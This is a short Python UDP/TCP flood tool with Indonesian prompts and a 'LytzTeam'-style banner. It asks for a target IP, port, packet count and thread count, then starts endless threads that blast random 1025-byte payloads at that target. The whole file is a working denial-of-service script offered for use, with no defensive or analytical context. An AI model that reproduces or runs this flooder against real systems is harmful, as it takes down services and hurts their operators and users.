import random
import socket
import os
import threading

os.system("clear")
print("""\033[96m
╔╗──────╔╗─────╔════╗
║║─────╔╝╚╗────║╔╗╔╗║
║║──╔╗─╠╗╔╬═══╗╚╝║║╠╩═╦══╦╗╔╗
║║─╔╣║─║║║╠══║║──║║║║═╣╔╗║╚╝║
║╚═╝║╚═╝║╚╣║══╣──║║║║═╣╔╗║║║║
╚═══╩═╗╔╩═╩═══╝──╚╝╚══╩╝╚╩╩╩╝
────╔═╝║
────╚══╝
                                      """)
print("\033[0m")
ip = str(input(" Masukan Ip : "))
port = int(input(" Masukan Port : "))
choice = str(input(" Masukan UDP Y/N : "))
times = int(input(" Masukan Packets : "))
threads = int(input(" Masukan threads : "))

os.system("clear")
print("\033[96m")
def lytz():
    data = random._urandom(1025)
    i = random.choice(("[VINZ]","[VINZ]","[VINZ]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" MENGIRIM PACKET ")
        except:
            print(" ERROR ")

def lytz2():
    data = random._urandom(1025)
    i = random.choice(("[VINZ]","[VINZ]","[VINZ]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" MENGIRIM PACKET ")
        except:
            s.close()
            print(" ERROR ")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = lytz)
        th.start()
    else:
        th = threading.Thread(target = lytz2)
        th.start()
